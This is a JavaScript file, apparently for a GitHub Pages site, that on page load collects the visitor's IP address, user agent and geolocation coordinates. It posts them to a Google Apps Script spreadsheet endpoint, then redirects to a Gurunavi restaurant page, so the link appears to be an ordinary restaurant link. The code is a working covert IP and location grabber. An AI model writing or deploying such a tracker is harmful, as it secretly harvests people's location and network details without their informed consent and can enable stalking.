// Google Apps ScriptのウェブアプリURL
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxOC9ZTbVPV8Oay1INos6L4IRSYQlM8HFYoLsEKgP3SgYxpOOLCst9VoyXlrUxUlMlQ/exec';

// IPアドレスを取得
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        console.log('IP取得成功:', data.ip);
        return data.ip;
    } catch (error) {
        console.error('IP取得エラー:', error);
        return '不明';
    }
}

// 位置情報を取得して送信
async function recordLocation() {
    const ip = await getIP();
    const userAgent = navigator.userAgent;
    console.log('UserAgent:', userAgent);

    if (navigator.geolocation) {
        console.log('位置情報API利用可能');
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                console.log('位置情報許可:', position.coords);
                const data = {
                    ip: ip,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    userAgent: userAgent
                };
                await sendToGoogleSheet(data);
                window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
            },
            async (error) => {
                console.error('位置情報拒否またはエラー:', error);
                const data = {
                    ip: ip,
                    latitude: '拒否',
                    longitude: '拒否',
                    userAgent: userAgent
                };
                await sendToGoogleSheet(data);
            },
            {
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        console.error('位置情報API非対応');
        const data = {
            ip: ip,
            latitude: '非対応',
            longitude: '非対応',
            userAgent: userAgent
        };
        await sendToGoogleSheet(data);
    }
}

// Googleスプレッドシートにデータを送信
async function sendToGoogleSheet(data) {
    try {
        console.log('送信データ:', data);
        const response = await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', // GitHub Pagesでの制限対応
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        console.log('データ送信成功（no-corsのため応答確認不可）');
    } catch (error) {
        console.error('送信エラー:', error);
    }
}

// ページ読み込み時に実行
window.onload = () => {
    console.log('ページ読み込み開始');
    recordLocation();
};
​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
